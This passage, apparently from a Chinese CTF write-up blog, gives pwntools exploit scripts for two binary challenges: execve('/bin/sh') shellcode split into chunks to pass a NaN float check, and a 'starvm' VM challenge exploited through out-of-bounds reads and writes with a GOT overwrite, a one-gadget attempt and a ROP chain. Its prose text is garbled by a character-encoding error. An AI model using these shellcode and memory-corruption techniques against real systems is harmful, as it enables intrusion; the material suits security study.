class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0x1867)&#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0174E)&#x27;)</span></span><br><span class="line">NaNHeader = <span class="string">b&quot;\xFF\xfF&quot;</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#first</span></span><br><span class="line"><span class="comment">#FFFFFFB3</span></span><br><span class="line">call=<span class="string">b&#x27;\xE8\xb3\xFF\xFF\xFF&#x27;</span>+<span class="string">b&#x27;6&#x27;</span>+NaNHeader</span><br><span class="line"><span class="comment">#second</span></span><br><span class="line">jmp=<span class="string">b&#x27;\xE9\xb3\xFF\xFF\xFF&#x27;</span>+<span class="string">b&#x27;6&#x27;</span>+NaNHeader</span><br><span class="line"><span class="comment">#third</span></span><br><span class="line"><span class="comment"># B6</span></span><br><span class="line"><span class="comment"># jmp=b&#x27;\xEb\xb6&#x27;+b&#x27;beef&#x27;+NaNHeader</span></span><br><span class="line">sa(<span class="string">&#x27;expression:&#x27;</span>,<span class="string">b&#x27;1 2 0 hh&#x27;</span>+shellcode.ljust(<span class="number">0x48</span>,<span class="string">b&#x27;\x00&#x27;</span>)+call)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•2"><a href="#æ–¹æ³•2" class="headerlink" title="æ–¹æ³•2"></a>æ–¹æ³•2</h3><p>æ ¹æ®æµ®ç‚¹æ•°çš„è§£é‡Šè§„åˆ™æ¥çœ‹ï¼Œåœ¨æœ‰æ•ˆæ•°éƒ½ä¸º0æ—¶ï¼Œé˜¶ç æœ€å°3FF(1023),æœ‰æ•ˆæ•°éƒ½ä¸º1ï¼Œæœ€å¤§ä¹Ÿå°±æ— é™æ¥è¿‘2ï¼Œæ‰€ä»¥é˜¶ç æœ€å¤§ä¸º1023+log<sub>2</sub>(100&#x2F;2)&#x3D;1,028.643 å³404hå¤š</p><p>REXå‰ç¼€çš„å€¼ä»‹äº40håˆ°4Fhä¹‹é—´,<strong>ä¸€æ¡æŒ‡ä»¤åªèƒ½æœ‰ä¸€ä¸ªREXå‰ç¼€ï¼Œå¿…é¡»ç´§æ¥åœ¨æŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªæ“ä½œç å­—èŠ‚ä¹‹å‰ã€‚ REXå‰ç¼€åœ¨å…¶ä»–ä»»ä½•ä½ç½®éƒ½å°†è¢«å¿½ç•¥ã€‚</strong></p><p>40çš„å‰ç¼€æ˜¯å¯ä»¥ä½¿ç”¨çš„,<strong>å½“æˆ‘ä»¬ç”¨<code>\x40</code>è¦†ç›–æŸäº›æŒ‡ä»¤æ—¶å¯ä»¥è½¬ä¹‰æˆ–è¢«å¿½ç•¥ï¼ˆç›¸å½“äºnopï¼‰</strong></p><p>è¿™è¾¹è‡³å°‘è¦å¼€å¤´ä¸¤ä¸ª0x40æ‰èƒ½æ„æˆ0x404çš„å¼€å¤´ç»•è¿‡æ£€æŸ¥ï¼Œæ‰€ä»¥å•å¥çš„payloadä¸èƒ½å¤§äº6ä¸ªå­—èŠ‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    mul rsi #æŠŠraxç½®é›¶</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, 0x68732f</span></span><br><span class="line"><span class="string">    shl rdi,0x10</span></span><br><span class="line"><span class="string">    add di,0x6e69</span></span><br><span class="line"><span class="string">    shl rdi,0x10</span></span><br><span class="line"><span class="string">    add di,0x622f</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov al, 59</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_sc</span>(<span class="params">ft</span>):</span><br><span class="line">    pd = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0</span>:asm(ft)</span><br><span class="line">        &#125;,filler = <span class="string">&#x27;\x40&#x27;</span>,length=<span class="number">8</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> pd</span><br><span class="line">payload=set_sc(<span class="string">&#x27;xor rsi, rsi&#x27;</span>)+set_sc(<span class="string">&#x27;mul rsi&#x27;</span>)+set_sc(<span class="string">&#x27;mov edi, 0x68732f&#x27;</span>)+set_sc(<span class="string">&#x27;shl rdi,0x10&#x27;</span>)+set_sc(<span class="string">&#x27;add di,0x6e69&#x27;</span>)+set_sc(<span class="string">&#x27;shl rdi,0x10&#x27;</span>)+set_sc(<span class="string">&#x27;add di,0x622f&#x27;</span>)+set_sc(<span class="string">&#x27;push rdi&#x27;</span>)+set_sc(<span class="string">&#x27;mov rdi, rsp&#x27;</span>)+set_sc(<span class="string">&#x27;mov al, 59&#x27;</span>)+set_sc(<span class="string">&#x27;push rax&#x27;</span>)+set_sc(<span class="string">&#x27;syscall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;expression:&#x27;</span>,<span class="string">b&#x27;1 2 0 hh&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+payload)</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•3"><a href="#æ–¹æ³•3" class="headerlink" title="æ–¹æ³•3"></a>æ–¹æ³•3</h3><p>å®˜æ–¹paylaodæ˜¯æ„é€ äº†jmp 4æ¥è·³åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; disasm(b<span class="string">&quot;\xEB\x02&quot;</span>)</span><br><span class="line"><span class="string">&#x27;   0:   eb 02                   jmp    0x4&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">jmpn = <span class="string">b&quot;\xEB\x02&quot;</span></span><br><span class="line">NaNHeader = <span class="string">b&quot;\xFF\x7F&quot;</span></span><br><span class="line"><span class="comment"># 0:  31 c0                   xor    eax,eax</span></span><br><span class="line"><span class="comment"># 2:  31 db                   xor    ebx,ebx</span></span><br><span class="line"><span class="comment"># 4:  66 b8 3b 00             mov    ax,0x3b</span></span><br><span class="line"><span class="comment"># 8:  66 bb 68 00             mov    bx,0x68</span></span><br><span class="line"><span class="comment"># c:  48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line"><span class="comment"># 10: 66 bb 2f 73             mov    bx,0x732f</span></span><br><span class="line"><span class="comment"># 14: 48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line"><span class="comment"># 18: 66 bb 69 6e             mov    bx,0x6e69</span></span><br><span class="line"><span class="comment"># 1c: 48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line"><span class="comment"># 20: 66 bb 2f 62             mov    bx,0x622f</span></span><br><span class="line"><span class="comment"># 24: 53                      push   rbx</span></span><br><span class="line"><span class="comment"># 25: 48 89 e7                mov    rdi,rsp</span></span><br><span class="line"><span class="comment"># 28: 31 f6                   xor    esi,esi</span></span><br><span class="line"><span class="comment"># 2a: 31 d2                   xor    edx,edx</span></span><br><span class="line"><span class="comment"># 2c: 0f 05                   syscall</span></span><br><span class="line">payload += <span class="string">b&#x27;\x31\xc0\x31\xdb&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xb8\x3b\x00&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xbb\x68\x00&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xbb\x2f\x73&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xbb\x69\x6e&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xbb\x2f\x62&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x53\x48\x89\xe7&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x31\xf6\x31\xd2&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x0f\x05\x90\x90&#x27;</span> + jmpn + NaNHeader    <span class="comment"># \x90 is nop</span></span><br></pre></td></tr></table></figure><p>å°äºå››å­—èŠ‚çš„å¯ä»¥ç”¨nopæ¥å¡«å……</p><h2 id="starvm"><a href="#starvm" class="headerlink" title="starvm"></a>starvm</h2><p>ç¬¬ä¸€æ¬¡æ¥è§¦vm pwnï¼Œæ˜¯ä¸€ä¸ªc++å†™çš„å“ˆä½›æ¶æ„çš„è™šæ‹Ÿæœº,c++çš„stlé€†å‘å¥½éš¾æ‡‚,ä½†æ˜¯vm pwnæœ€ä¸»è¦çš„å°±æ˜¯é€†æ¸…æ¥šè™šæ‹Ÿæœºç»“æ„ä½“å’ŒæŒ‡ä»¤æ“ä½œï¼Œéš¾æå“¦</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;instr*&gt; codestack;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; datastack;</span><br><span class="line">    <span class="built_in">vector</span>&lt;instr*&gt;::iterator ip;</span><br><span class="line">    <span class="type">int</span> reg[<span class="number">14</span>]; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>* mem;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> eflags;</span><br><span class="line"></span><br><span class="line">&#125; starvm;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> instr_code;<span class="comment">//æ“ä½œç </span></span><br><span class="line">    <span class="type">int</span> instr_num;<span class="comment">//æ“ä½œæ•°çš„ä¸ªæ•°</span></span><br><span class="line">&#125;instr;</span><br></pre></td></tr></table></figure><p>æŒ‡ä»¤å‚¨å­˜å’Œæ•°æ®å‚¨å­˜åˆ†å¼€ï¼Œå…ˆåˆå§‹åŒ–codeååˆå§‹åŒ–dataï¼Œç„¶åå°±æ˜¯å–æŒ‡ä»¤ è¯‘ç  æ‰§è¡Œ æ›´æ–°pcçš„æ“ä½œ</p><blockquote><p>vectorçš„ç»“æ„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="built_in">vector</span> struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_9) ; XREF:</span><br><span class="line"><span class="number">00000000</span>                                         </span><br><span class="line"><span class="number">00000000</span> _M_start dq ?</span><br><span class="line"><span class="number">00000008</span> _M_finish dq ?</span><br><span class="line"><span class="number">00000010</span> _M_end_of_storage dq ?</span><br><span class="line"><span class="number">00000018</span> <span class="built_in">vector</span> ends</span><br></pre></td></tr></table></figure></blockquote><p>æ¼æ´æ˜¯dataåˆå§‹åŒ–æ—¶æ²¡æœ‰é™åˆ¶æ•°å­—ï¼Œåœ¨6 7æŒ‡ä»¤ä¼šå¯¼è‡´ç”³è¯·çš„å †çš„è¶Šç•Œè¯»å†™ï¼Œ10æŒ‡ä»¤æ²¡æœ‰æ£€æŸ¥å€¼ä¼šå¯„å­˜å™¨è¶Šç•Œè¦†ç›–æ‰memæŒ‡é’ˆï¼Œæ¼æ´éƒ½å¯ä»¥é€ æˆä»»æ„åœ°å€è¯»å†™</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> VM_LOAD:<span class="number">6</span></span><br><span class="line">            <span class="comment">// load reg, bias</span></span><br><span class="line">                op1 = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                meml = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                <span class="keyword">if</span>(op1&gt;<span class="number">14</span>)&#123;</span><br><span class="line">                    bad();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(vmp-&gt;mem == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                    vmp-&gt;mem = (<span class="type">unsigned</span> <span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">0x70</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// oob read</span></span><br><span class="line">                vmp-&gt;reg[op1] = vmp-&gt;mem[meml];</span><br><span class="line">                vmp-&gt;ip++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> VM_UNLOAD:<span class="number">7</span></span><br><span class="line">            <span class="comment">// unload reg, bias</span></span><br><span class="line">                op1 = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                meml = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                <span class="keyword">if</span>(op1&gt;<span class="number">14</span>)&#123;</span><br><span class="line">                    bad();</span><br><span class="line">                &#125;</span><br><span class="line">                vmp-&gt;mem[meml] = vmp-&gt;reg[op1];</span><br><span class="line">                vmp-&gt;ip++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> VM_MOVINT:</span><br><span class="line">                <span class="comment">// MOVINT reg, int</span></span><br><span class="line">                op1 = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                vmp-&gt;reg[op1] = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                vmp-&gt;ip++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><p>exå¸ˆå‚…é‚£é‡Œçš„æ€è·¯å°±æ˜¯mallocgotä¸ºsetvbufï¼Œsetvbufgotä¸ºsystemï¼Œç„¶åä¿®æ”¹sevbufå‚æ•°stdinæŒ‡å‘å­—ç¬¦ä¸²shï¼Œæœ€åå†æŠŠmemæŒ‡é’ˆç½®é›¶è§¦å‘maloc</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span> )</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./starvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x401754&#x27;)</span></span><br><span class="line"></span><br><span class="line">cmd = [<span class="number">10</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">6</span>]</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;command:\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cmd]).encode() + <span class="string">b&#x27; 16&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">10 reg[op1]=op2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6  reg[op1]=mem[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3 reg[op1]=reg[op1] - reg[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7 mem[op2]=reg[op1]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">cost = [<span class="number">14</span>, <span class="number">0x404020</span>, <span class="comment"># 10  mem=0x404020 setvbufgot</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 6        reg[0]=mem[0]</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">0x30910</span>, <span class="comment"># 10    reg[1]=0x30910</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>, <span class="comment"># 3        reg[0]=mem[0]0x81670-0x30910 system</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7         setvbufgot=system</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0x404070</span>, <span class="comment"># 10     mem=malloc</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0x401270</span>, <span class="comment"># 10    reg[0]=0x401270</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7     mallocgot=0x401270</span></span><br><span class="line">        <span class="number">2</span>, <span class="number">1</span>, <span class="comment"># 7     mallocgoté«˜ä½=0</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0x4040D0</span>, <span class="comment"># 10 mem=stdin</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0x4040D8</span>, <span class="comment"># 10    reg[0]=0x4040D8</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">0x6873</span>, <span class="comment"># 10    reg[1]=0x6873 sh</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7     stdinlow=0x4040D8</span></span><br><span class="line">        <span class="number">2</span>, <span class="number">1</span>, <span class="comment"># 7     stdinhigh=0</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">2</span>, <span class="comment"># 7     0x4040D8=0x6873</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0</span>, <span class="comment"># 10    memç½®é›¶</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 6        è§¦å‘malloc</span></span><br><span class="line">        <span class="number">0xdeadbeef</span>]</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;your cost:\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cost]).encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>ç”±äºä¸€å¼€å§‹ç»™äº†æ ˆåœ°å€ï¼Œå°±æƒ³ç€ä¿®æ”¹è¿”å›åœ°å€ä¸ºoggï¼Œä½†æ˜¯glibc2.35çš„oggå¤ªéš¾ç”¨äº†ï¼Œæ²¡ä¸€ä¸ªæˆåŠŸ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span> )</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./starvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh,<span class="string">&#x27;b *0x00401A38&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = [<span class="number">10</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">7</span>]</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;at &#x27;</span>)</span><br><span class="line">stack_ret=<span class="built_in">int</span>(sh.recv(<span class="built_in">len</span>(<span class="string">&#x27;7fff3b21f080&#x27;</span>)),<span class="number">16</span>)-(<span class="number">0x7ffd188fa9d0</span>-<span class="number">0x7ffd188fa9e8</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;command:\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cmd]).encode() + <span class="string">b&#x27; 16&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">10 reg[op1]=op2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6  reg[op1]=mem[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7 mem[op2]=reg[op1]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2 reg[op1]=reg[op1] + reg[op2]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ogg=<span class="number">0xebcf8</span>-<span class="number">0x29d90</span></span><br><span class="line">cost = [<span class="number">14</span>,stack_ret&amp;<span class="number">0xffffffff</span>,</span><br><span class="line">        <span class="number">15</span>,(stack_ret&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>,<span class="comment">#ä¿®æ”¹memä¸ºæ ˆä¸Šmainçš„è¿”å›åœ°å€</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,<span class="comment">#6 reg[0]=mem[0]</span></span><br><span class="line">        <span class="number">1</span>,ogg,<span class="comment">#10 reg[op1]=ogg</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">1</span>,<span class="comment">#2 reg[0]=reg[1] + reg[0]</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">        <span class="number">0xdeadbeef</span>]</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;your cost:\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cost]).encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x50a37 posix_spawn(rsp+0x1c, &quot;/bin/sh&quot;, 0, rbp, rsp+0x60, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string">  rbp == NULL || (u16)[rbp] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebcf1 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebcf5 execve(&quot;/bin/sh&quot;, r10, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebcf8 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>æœ‰ä¸ªsyscal retçš„gadgetåšåé—¨å¯ä»¥å†™ropé“¾</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span> )</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./starvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh,&#x27;b *0x40198B&#x27;)</span></span><br><span class="line">gdb.attach(sh,<span class="string">&#x27;b *0x401325&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = [<span class="number">10</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">7</span>]</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;at &#x27;</span>)</span><br><span class="line">stack_ret=<span class="built_in">int</span>(sh.recv(<span class="built_in">len</span>(<span class="string">&#x27;7fff3b21f080&#x27;</span>)),<span class="number">16</span>)-(<span class="number">0x7ffd188fa9d0</span>-<span class="number">0x7ffd188fa9e8</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_ret))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;command:\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cmd]).encode() + <span class="string">b&#x27; 16&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">10 reg[op1]=op2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6  reg[op1]=mem[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3 reg[op1]=reg[op1] - reg[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7 mem[op2]=reg[op1]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2 reg[op1]=reg[op1] + reg[op2]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401468</span></span><br><span class="line">xorrdx=<span class="number">0x0000000000401464</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004017cb</span></span><br><span class="line">poprsi=<span class="number">0x00000000004016f0</span></span><br><span class="line">syscall=<span class="number">0x000000000040146a</span></span><br><span class="line">ogg=<span class="number">0xebcf8</span>-<span class="number">0x29d90</span></span><br><span class="line">sh_str=stack_ret+<span class="number">0x40</span></span><br><span class="line">cost = [<span class="number">14</span>,stack_ret&amp;<span class="number">0xffffffff</span>,</span><br><span class="line">        <span class="number">15</span>,(stack_ret&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>,</span><br><span class="line">        <span class="number">0</span>,poprsi,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">1</span>, <span class="comment">#7  pop rsi</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">2</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span 